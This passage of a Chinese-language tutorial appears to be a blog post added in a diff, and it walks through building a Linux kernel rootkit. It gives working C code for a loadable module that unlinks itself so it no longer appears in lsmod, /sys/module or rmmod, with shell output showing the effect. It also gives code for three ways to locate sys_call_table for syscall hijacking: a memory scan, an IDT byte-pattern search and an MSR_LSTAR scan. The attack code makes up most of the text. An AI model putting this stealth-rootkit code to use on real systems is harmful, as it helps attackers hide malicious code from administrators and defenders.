+<p>​    所以原理大概是同上，我们通过<code>kobject_del()</code>函数删除我们当前模块的<code>kobject</code>就可以起到在<code>/sys/module</code>中隐藏<code>lkm</code>的作用。这里使用的函数是<code>kobject_del</code>我们在<code>&amp;THIS_MODULE</code>上使用它，并将其指向<code>obj</code>，这个函数只使用<code>sysfs_remove_dir（obj)</code>从VFS中删除相关目录。代码:<code>kobject_del(&amp;THIS_MODULE-&gt;mkobj.kobj);</code></p>
+<p><code>&amp;THIS_MODULE</code>的定义在<code>include/llinux/export.h</code>中，源码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">module</span> __<span class="title">this_module</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THIS_MODULE (&amp;__this_module)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THIS_MODULE ((struct module *)0)</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看出THIS_MODULE的作用是指向当前模块。<code>&amp;THIS_MODULE-&gt;mkobj.kobj</code>则代表的是struct module结构体的成员<code>struct module_kobject</code>的一部分，结构体的定义如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module_kobject</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">mod</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> *<span class="title">drivers_dir</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module_param_attrs</span> *<span class="title">mp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">kobj_completion</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
+
+<p>代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">rooty_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    list_del_init(&amp;__this_module.<span class="built_in">list</span>);</span><br><span class="line">    kobject_del(&amp;THIS_MODULE-&gt;mkobj.kobj);</span><br><span class="line">    <span class="comment">//printk("rooty: module loaded\n");</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/rootkit# insmod rooty.ko</span><br><span class="line">root@kali:~/Documents/rootkit# lsmod |grep rooty.ko</span><br><span class="line">root@kali:~/Documents/rootkit# modinfo rooty</span><br><span class="line">modinfo: ERROR: Module rooty not found.</span><br><span class="line">root@kali:~/Documents/rootkit# ls /sys/module|grep rooty</span><br><span class="line">root@kali:~/Documents/rootkit# modprobe -c |grep rooty</span><br><span class="line">root@kali:~/Documents/rootkit# grep rooty /proc/kallsyms</span><br></pre></td></tr></table></figure>
+
+<p>我们无法找到有关模块<code>rooty.ko</code>的任何信息，需要注意的是，我们也无法像正常模块一样使用<code>rmmod</code>命令移除它。</p>
+<h3 id="1-3-小结"><a href="#1-3-小结" class="headerlink" title="1.3 小结"></a>1.3 小结</h3><p>​    这部分中，我们知道了：</p>
+<ul>
+<li>如何写一个内核模块</li>
+<li>如何加载内核模块</li>
+<li>如何查看内核信息</li>
+<li>如何释放我们加载的内核模块</li>
+<li>如何隐藏我们的内核模块</li>
+</ul>
+<h2 id="2-初探rootkit"><a href="#2-初探rootkit" class="headerlink" title="2 初探rootkit"></a>2 初探rootkit</h2><p>以上的过程，我们实现了一个简单的<code>lkm</code>并将它隐藏的起来，现在么们将会使用这个这个隐藏的<code>lkm</code>实现一些功能。比如隐藏文件，进程等等，并且实现一系列的<code>rootkit</code>工具。接下来要做的事情是劫持系统调用，并实现文件隐藏。</p>
+<h3 id="2-1-系统调用"><a href="#2-1-系统调用" class="headerlink" title="2.1 系统调用"></a>2.1 系统调用</h3><p>​    了解了系统调用之后，我们才知道操作系统实际的运行方式以及<code>rootkit</code>工作的基本要求，在这里不会赘述如何实现它，只会j简单的概述一下它们是什么。系统调用是程序和内核服务交互的方式。它们涵盖了进程管理，文件管理，设备管理，信息管理，通信（内核调度）的所有操作。在保护模式下，内核决定了一组系统调用以及其相关实现。所以系统调用号是不可逆的，而有关系统调用的定义存储在<code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code>中，这里截取前面几个简单的看一下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_write 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_open 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_close 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stat 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstat 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lstat 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_poll 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lseek 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mmap 9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mprotect 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munmap 11</span></span><br></pre></td></tr></table></figure>
+
+<p>这里有有关系统调用的资料，可以看一下：</p>
+<ul>
+<li><a href="https://zh.wikipedia.org/wiki/系统调用" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/系统调用</a></li>
+<li><a href="https://developer.ibm.com/tutorials/l-system-calls/" target="_blank" rel="noopener">https://developer.ibm.com/tutorials/l-system-calls/</a></li>
+</ul>
+<p>下面一张图展示了如何用户如何获得pid</p>
+<p><img src="/.com//figure1.gif" alt="用户使用getpid(D:/mygithub/USTC-LIFE/%E5%A4%87%E5%BF%98%E5%BD%95/assets/figure1.gif)函数过程"></p>
+<ul>
+<li>用户调用<code>getpid(void)</code>库，C标准库在一个段寄存器中存储<code>getpid</code>的系统调用号，并启动<code>0x80</code>中断，执行<code>system_call</code>函数。这个函数处理的是由<code>eax</code>内容标识的所有系统调用，然后经过一些步骤之后，它调用真正的系统调用<code>sysytem_call_table</code>和<code>exa</code>中存放的中断索引。从系统调用返回之后，<code>sysytemcall_exit</code>退出系统调用，并从内核态返回用户态，将结果返回给用户。</li>
+<li>所以我们能够知道的是，在<code>system_call_table</code>中存放的是所有系统调用位置的指针，如果我们能够找到它，就可以修改它里面某个系统调用的指针，使得它指向的经过我们修改之后的函数。</li>
+</ul>
+<p>现在有有个问题是，自从2.6.x内核开始，我们无法直接导出<code>system_call_talbe</code>的地址了。所以需要查找它的地址。</p>
+<h3 id="2-2-查找sys-call-table地址"><a href="#2-2-查找sys-call-table地址" class="headerlink" title="2.2 查找sys_call_table地址"></a>2.2 查找<code>sys_call_table</code>地址</h3><h4 id="2-2-1-从-boot-System-map中读取"><a href="#2-2-1-从-boot-System-map中读取" class="headerlink" title="2.2.1 从/boot/System.map中读取"></a>2.2.1 从<code>/boot/System.map</code>中读取</h4><p>​    <code>system.map</code>是系统的映射。具体是内核符号和其所在内存地址两者的用设，通过地址我们可以找到符号，也就是变量和函数，通过符号，我们也能知道它所在的地址，在这里，我们一直的符号是<code>sys_call_table</code>系统调用表，从<code>system.map</code>中我们就可以找到系统调用表所在的内存地址。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/boot# cat System.map-4.19.0-kali1-amd64 | head -20</span><br><span class="line">0000000000000000 D __per_cpu_start</span><br><span class="line">0000000000000000 D irq_stack_union</span><br><span class="line">00000000000001e0 A kexec_control_code_size</span><br><span class="line">0000000000004000 D cpu_debug_store</span><br><span class="line">0000000000005000 D cpu_tss_rw</span><br><span class="line">0000000000008000 D gdt_page</span><br><span class="line">0000000000009000 d exception_stacks</span><br><span class="line">000000000000e000 d entry_stack_storage</span><br><span class="line">000000000000f000 D espfix_waddr</span><br><span class="line">000000000000f008 D espfix_stack</span><br><span class="line">000000000000f010 D cpu_llc_id</span><br><span class="line">000000000000f020 D cpu_llc_shared_map</span><br><span class="line">000000000000f060 D cpu_core_map</span><br><span class="line">000000000000f0a0 D cpu_sibling_map</span><br><span class="line">000000000000f0e0 D cpu_info</span><br><span class="line">000000000000f1d0 D cpu_number</span><br><span class="line">000000000000f1d8 D this_cpu_off</span><br><span class="line">000000000000f1e0 D x86_cpu_to_acpiid</span><br><span class="line">000000000000f1e4 D x86_cpu_to_apicid</span><br><span class="line">000000000000f1e6 D x86_bios_cpu_apicid</span><br></pre></td></tr></table></figure>
+
+<p>同样，我们可以直接查一下，系统调用表内存地址是多少。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/boot# cat System.map-4.19.0-kali1-amd64 | grep "sys_call_table"</span><br><span class="line">ffffffff81c001e0 R sys_call_table</span><br><span class="line">ffffffff81c015c0 R ia32_sys_call_table</span><br></pre></td></tr></table></figure>
+
+<p>到这里我们先停下，目前我们做到的是，得到了<code>sys_call_table</code>地址。</p>
+<h4 id="2-2-2-确定大概范围然后将其与我们导出的符号进行比较"><a href="#2-2-2-确定大概范围然后将其与我们导出的符号进行比较" class="headerlink" title="2.2.2 确定大概范围然后将其与我们导出的符号进行比较"></a>2.2.2 确定大概范围然后将其与我们导出的符号进行比较</h4><p><code>#define __NR_close (__NR_SYSCALL_BASE+ 6)</code>，在这里我们导出的符号是<code>close</code>，当我们的指针+偏移量与<code>sys_close</code>值匹配的时候，我们就成功的在内存中找到了<code>sys_call_table</code>了。如过没有的话，我们修改一下指针大小遍历即可。</p>
+<p>代码如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/syscalls.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> START_CHECK 0xffffffff81000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> END_CHECK 0xffffffffa2000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *sys_call_table;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">get_sys_call_table</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> **entry;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> i = START_CHECK;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; END_CHECK)&#123;</span><br><span class="line">        entry = (<span class="keyword">unsigned</span> <span class="keyword">long</span> **)i;</span><br><span class="line">        <span class="keyword">if</span>(entry[__NR_close] == (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)sys_close)&#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;entry[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        i += <span class="keyword">sizeof</span>(<span class="keyword">void</span> *);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rooty_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sys_call_table = get_sys_call_table();</span><br><span class="line">    <span class="keyword">if</span> (!sys_call_table)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(<span class="string">"get_act_addr(): NULL...\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        printk(<span class="string">"sct: 0x%p\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)sys_call_table);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rooty_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"printsct3: module removed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">module_init(rooty_init);</span><br><span class="line">module_exit(rooty_exit);</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-2-3-通过IDT中断向量表来获取系统调用"><a href="#2-2-3-通过IDT中断向量表来获取系统调用" class="headerlink" title="2.2.3 通过IDT中断向量表来获取系统调用"></a>2.2.3 通过IDT中断向量表来获取系统调用</h4><h5 id="2-2-3-1-32位"><a href="#2-2-3-1-32位" class="headerlink" title="2.2.3.1 32位"></a>2.2.3.1 32位</h5><p>从2.1的图中我们能够看到中断向量表的工作过程。</p>
+<blockquote>
+<ul>
+<li>用户进程在执行系统调用前，先将系统调用号，输入的参数等放在寄存器中。</li>
+<li>发出0x80中断，也就是128号中断</li>
+<li>系统暂停用户进程，根据128号中断在终端向量表中找到中断服务程序system_call</li>
+<li>128号中断的中断服务程序system_call紧接着执行。在进行必要的处理后，<strong>统一调用 call <code>sys_call_table(%eax,4)</code>来调用sys_call_table表中的系统调用服务</strong>，<code>eax</code>存放的即时系统调用号；执行完毕后它又会把输出结果放到寄存器中。</li>
+<li>系统恢复用户进程，进程从寄存器中取到自己想要的东西，然后继续执行。</li>
+</ul>
+</blockquote>
+<p>根据过程，我们有利一下获取<code>sys_call_table</code>的思路：</p>
+<blockquote>
+<ul>
+<li>利用<code>sidt</code>指令，得到IDT</li>
+<li>在IDT中，找到0x80号向量中断服务程序地址<code>system_call</code></li>
+<li>从0x80号中断服务程序的地址开始硬编码搜索<code>\xff\x14\x85</code>(x86)，<code>\xff\x14\xc5</code>(x64)也就是<code>call</code>指令二进制格式，而中断调用语句是:<code>sys_call_table(%eax,4)</code></li>
+</ul>
+</blockquote>
+<p>代码如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> size;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> addr;</span><br><span class="line">&#125;__attribute__((packed)) idtr;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> offset_1;  <span class="comment">/*offset bits 0..15*/</span> </span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> selector;  <span class="comment">/*a code segment selector in GDT or LDT*/</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> zero;       <span class="comment">/*unused, set to 0*/</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> type_attr;  <span class="comment">/*type and attributes*/</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> offset_2;  <span class="comment">/*offset bits 16..31*/</span></span><br><span class="line">&#125;__attribute__((packed)) idt;</span><br></pre></td></tr></table></figure>
+
+<p>这两个结构体代表的是IDTR和IDT表项，IDTR是用来定位IDT位置的，因为IDT表可以驻留在线性地址空间的任何地方，所以处理器专门有寄存器来储存IDT的位置，也就是IDTR寄存器。我们通过<code>sidt</code>指令加载IDTR寄存器的内容，然后储存到我们自己的这个结构体中，然后通过其找到IDT的位置所在，将IDT存到我们所设的结构体中，便于操作。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span>  *<span class="title">find_sys_call_table</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> sys_call_off;</span><br><span class="line">	<span class="keyword">char</span> *p;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ret;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//调用idtr指令，然后将加载出来的中断描述符表寄存器中的内容存入我们之前准备好的的idtr结构体</span></span><br><span class="line">	<span class="keyword">asm</span>(<span class="string">"sidt %0"</span>:<span class="string">"=m"</span>(idtr));</span><br><span class="line">    <span class="comment">//获取0×80中断所对应的IDT中的表项。中断描述符表共256项，每项8字节，每项代表一种中断类型。所以我们要从IDR起始地址后的8*0×80位置拷贝一个IDT表项大小的数据，也就是0×80中断所对应的IDT中的表项</span></span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;idt, idtr.addr+<span class="number">8</span>*<span class="number">0x80</span>, <span class="keyword">sizeof</span>(idt));</span><br><span class="line">    <span class="comment">//这条语句获取的是128号中断的中断服务程序system_call的地址</span></span><br><span class="line">	sys_call_off = ((idt.offset_2&lt;&lt;<span class="number">16</span>) | idt.offset_1);</span><br><span class="line">	p = sys_call_off;</span><br><span class="line">    <span class="comment">//搜索\xff\x14\x85，得到sys_call_table地址。</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">100</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if(p[i]=='\xff' &amp;&amp; p[i+1]=='\x14' &amp;&amp; p[i+2]=='\x85')</span><br><span class="line">			ret = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(p+i+<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	printk(<span class="string">"Arciryas:sys_call_table-0x%x\n"</span>, ret);</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">long</span>**)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于没有32位机器，不测试</p>
+<h5 id="2-2-3-2-64位"><a href="#2-2-3-2-64位" class="headerlink" title="2.2.3.2 64位"></a>2.2.3.2 64位</h5><p>在64位系统中，IDT的编排头不用经过计算，直接可以从寄存器中取出来。</p>
+<p>其他的和32位类似</p>
+<p>代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/file.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/list.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>** sys_call_table;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *</span><br><span class="line">get_lstar_sct_addr(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    u64 lstar;</span><br><span class="line">    u64 index;</span><br><span class="line">    </span><br><span class="line">    rdmsrl(MSR_LSTAR, lstar);</span><br><span class="line">    <span class="keyword">for</span> (index = <span class="number">0</span>; index &lt;= PAGE_SIZE; index += <span class="number">1</span>) &#123;</span><br><span class="line">        u8 *arr = (u8 *)lstar + index;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (arr[<span class="number">0</span>] == <span class="number">0xff</span> &amp;&amp; arr[<span class="number">1</span>] == <span class="number">0x14</span> &amp;&amp; arr[<span class="number">2</span>] == <span class="number">0xc5</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> arr + <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> **</span><br><span class="line">get_lstar_sct(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *lstar_sct_addr = get_lstar_sct_addr();</span><br><span class="line">    <span class="keyword">if</span> (lstar_sct_addr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        u64 base = <span class="number">0xffffffff00000000</span>;</span><br><span class="line">        u32 code = *(u32 *)lstar_sct_addr;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">void</span> *)(base | code);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;                                         </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">filter_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    sys_call_table = get_lstar_sct();</span><br><span class="line">    <span class="keyword">if</span> (!sys_call_table)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(<span class="string">"get_act_addr(): NULL...\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        printk(<span class="string">"sct: 0x%p\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)sys_call_table);</span><br><span class="line">	    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">filter_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"hideps: module removed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">module_init(filter_init);</span><br><span class="line">module_exit(filter_exit);</span><br></pre></td></tr></table></figure>
+
